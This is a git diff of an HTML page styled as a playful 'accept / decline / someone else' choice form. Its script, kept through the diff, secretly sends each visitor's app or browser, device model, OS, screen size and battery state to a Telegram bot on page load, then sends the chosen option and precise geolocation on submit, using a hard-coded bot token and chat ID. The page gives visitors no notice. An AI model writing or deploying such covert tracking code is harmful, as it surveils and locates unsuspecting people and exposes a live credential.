@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,92 +8,47 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
         body {
-            background: linear-gradient(135deg, #4b0082, #ff4500, #8a2be2, #00ffff);
-            background-size: 400% 400%;
-            animation: gradientBG 8s ease infinite;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            color: white;
+            background: linear-gradient(135deg, #8e44ad, #3498db, #ff6347);
+            animation: gradient 6s ease infinite;
+            display: flex; justify-content: center; align-items: center; height: 100vh; color: white;
         }
-        @keyframes gradientBG {
+        @keyframes gradient {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
         .container {
-            text-align: center;
-            padding: 3rem;
-            border-radius: 20px;
-            backdrop-filter: blur(20px);
-            background: rgba(0, 0, 0, 0.6);
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
-            animation: glow 3s infinite alternate;
+            padding: 2rem; text-align: center; border-radius: 20px; backdrop-filter: blur(20px);
+            background: rgba(0, 0, 0, 0.7); box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
         }
-        @keyframes glow {
-            from { box-shadow: 0 0 20px #ff00ff; }
-            to { box-shadow: 0 0 40px #00ffff; }
-        }
-        h1 {
-            font-size: 2rem;
-            margin-bottom: 2rem;
-            background: linear-gradient(90deg, #ff00ff, #00ffff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .option {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            margin: 1rem 0;
-        }
+        h1 { margin-bottom: 2rem; font-size: 2rem; }
+        .option { margin: 1rem 0; display: flex; gap: 1rem; align-items: center; }
         input[type="checkbox"] {
-            appearance: none;
-            width: 25px;
-            height: 25px;
-            border: 2px solid #ff00ff;
-            border-radius: 50%;
-            cursor: pointer;
+            width: 25px; height: 25px; appearance: none; border: 2px solid #fff; border-radius: 50%;
         }
-        input[type="checkbox"]:checked {
-            background: linear-gradient(45deg, #ff00ff, #00ffff);
-        }
-        label {
-            font-size: 1.5rem;
-            cursor: pointer;
-        }
+        input:checked { background: linear-gradient(45deg, #ff00ff, #00ffff); }
         .submit-btn {
-            margin-top: 2rem;
-            padding: 1rem 3rem;
-            font-size: 1.5rem;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            background: linear-gradient(90deg, #ff00ff, #00ffff);
-            transition: all 0.3s;
+            margin-top: 2rem; padding: 1rem 2rem; border: none; border-radius: 50px; font-size: 1.5rem; color: white;
+            background: linear-gradient(90deg, #ff00ff, #00ffff); cursor: pointer; transition: 0.3s;
         }
-        .submit-btn:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 30px #00ffff;
-        }
+        .submit-btn:hover { transform: scale(1.1); box-shadow: 0 0 20px #00ffff; }
     </style>
 </head>
+
 <body onload="sendInitialData()">
     <div class="container">
-        <h1>SELECT AN OPTION, OR IT WILL NEVER CHANGE</h1>
+        <h1>CHOOSE YOUR OPTION</h1>
         <div class="option">
-            <input type="checkbox" id="accept" name="choice" onclick="selectOnlyOne(this)">
-            <label for="accept">ACCEPT ✅</label>
+            <input type="checkbox" id="accept" onclick="selectOnlyOne(this)">
+            <label for="accept">✅ ACCEPT</label>
         </div>
         <div class="option">
-            <input type="checkbox" id="decline" name="choice" onclick="selectOnlyOne(this)">
-            <label for="decline">DECLINE ❌</label>
+            <input type="checkbox" id="decline" onclick="selectOnlyOne(this)">
+            <label for="decline">❌ DECLINE</label>
         </div>
         <div class="option">
-            <input type="checkbox" id="someoneElse" name="choice" onclick="selectOnlyOne(this)">
-            <label for="someoneElse">ALREADY IN RELATIONSHIP 🙂</label>
+            <input type="checkbox" id="someoneElse" onclick="selectOnlyOne(this)">
+            <label for="someoneElse">🙂 SOMEONE ELSE</label>
         </div>
         <button class="submit-btn" onclick="submitData()">SUBMIT</button>
     </div>
@@ -101,92 +57,90 @@
         const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
         const CHAT_ID = "5112680061";
 
-        function selectOnlyOne(selectedCheckbox) {
+        function selectOnlyOne(selected) {
             document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
-                if (checkbox !== selectedCheckbox) checkbox.checked = false;
+                if (checkbox !== selected) checkbox.checked = false;
             });
         }
 
-        function getBrowserInfo() {
-            let userAgent = navigator.userAgent.toLowerCase();
+        // Detecting the App or Browser
+        function detectApp() {
+            const ua = navigator.userAgent.toLowerCase();
+            const ref = document.referrer.toLowerCase();
 
-            if (document.referrer.includes("t.me") || userAgent.includes("telegram")) return "Telegram App";
-            if (document.referrer.includes("whatsapp") || userAgent.includes("whatsapp")) return "WhatsApp";
-            if (document.referrer.includes("instagram") || userAgent.includes("instagram")) return "Instagram App";
-            if (document.referrer.includes("facebook") || userAgent.includes("facebook")) return "Facebook App";
-            if (document.referrer.includes("twitter") || userAgent.includes("twitter")) return "Twitter";
-            if (document.referrer.includes("tiktok") || userAgent.includes("tiktok")) return "TikTok";
-            
-            if (userAgent.includes("chrome") && !userAgent.includes("edg")) return "Google Chrome";
-            if (userAgent.includes("safari") && !userAgent.includes("chrome")) return "Safari";
-            if (userAgent.includes("firefox")) return "Mozilla Firefox";
-            if (userAgent.includes("edg")) return "Microsoft Edge";
+            if (ua.includes("telegram") || ref.includes("t.me")) return "Telegram App";
+            if (ua.includes("whatsapp") || ref.includes("whatsapp")) return "WhatsApp";
+            if (ua.includes("instagram") || ref.includes("instagram")) return "Instagram";
+            if (ua.includes("facebook") || ref.includes("fb")) return "Facebook";
+            if (ua.includes("tiktok")) return "TikTok";
+            if (ua.includes("twitter")) return "Twitter";
+            if (ua.includes("edg")) return "Microsoft Edge";
+            if (ua.includes("firefox")) return "Mozilla Firefox";
+            if (ua.includes("safari") && !ua.includes("chrome")) return "Safari";
+            if (ua.includes("chrome")) return "Google Chrome";
 
-            return "Unknown Browser/App";
+            return "Unknown";
         }
 
+        // Get Device and Battery Info
         async function getDeviceInfo() {
-            let deviceInfo = "📱 **Device Info:**\n";
-            deviceInfo += `🔹 Opened in: ${getBrowserInfo()}\n`;
-
+            let info = `🔹 Opened in: ${detectApp()}\n`;
             if (navigator.userAgentData) {
                 const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platform", "platformVersion"]);
-                deviceInfo += `🔹 **Device Model:** ${ua.model || "Unknown"}\n`;
-                deviceInfo += `🔹 **OS:** ${ua.platform} ${ua.platformVersion}\n`;
+                info += `🔹 Device Model: ${ua.model || "Unknown"}\n🔹 OS: ${ua.platform} ${ua.platformVersion}\n`;
             } else {
-                deviceInfo += `🔹 **OS:** ${navigator.platform}\n`;
+                info += `🔹 OS: ${navigator.platform}\n`;
             }
+            info += `🔹 Screen: ${window.screen.width}x${window.screen.height}\n`;
 
-            deviceInfo += `🔹 **Screen:** ${window.screen.width}x${window.screen.height}\n`;
-            return deviceInfo;
+            const battery = await navigator.getBattery();
+            info += `🔋 Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})\n`;
+
+            return info;
         }
 
-        function sendInitialData() {
-            getDeviceInfo().then(deviceInfo => {
-                navigator.getBattery().then(battery => {
-                    const batteryStatus = `🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
-                    sendMessage(`🚀 **New User Visit**\n${deviceInfo}${batteryStatus}`);
-                });
-            });
+        // Send Initial Data on Page Load
+        async function sendInitialData() {
+            const deviceInfo = await getDeviceInfo();
+            sendMessage(`🚀 New User Visit\n${deviceInfo}`);
         }
 
+        // Capture Selected Option
         function getSelectedOption() {
             const checkboxes = document.querySelectorAll('input[type="checkbox"]');
-            for (let checkbox of checkboxes) {
+            for (const checkbox of checkboxes) {
                 if (checkbox.checked) return checkbox.nextElementSibling.innerText;
             }
             return null;
         }
 
+        // Send Form Data
         async function submitData() {
             const option = getSelectedOption();
             if (!option) return alert("Please select an option!");
 
-            navigator.getBattery().then(battery => {
-                getDeviceInfo().then(deviceInfo => {
-                    const message = `✅ **User Response**\n🟢 **Option:** ${option}\n${deviceInfo}🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
-                    sendMessage(message);
-                });
+            const deviceInfo = await getDeviceInfo();
+            sendMessage(`✅ User Response\n🟢 Option: ${option}\n${deviceInfo}`);
 
-                captureLocation();
-            });
+            captureLocation();
         }
 
+        // Capture User Location
         function captureLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendMessage(`📍 **Location:** Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
-                    () => sendMessage("📍 **Location:** Not Available"),
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    (pos) => sendMessage(`📍 Location: Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
+                    () => sendMessage("📍 Location: Not Available")
                 );
             }
         }
 
-        function sendMessage(text) {
+        // Send Message to Telegram
+        function sendMessage(message) {
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
             });
         }
     </script>
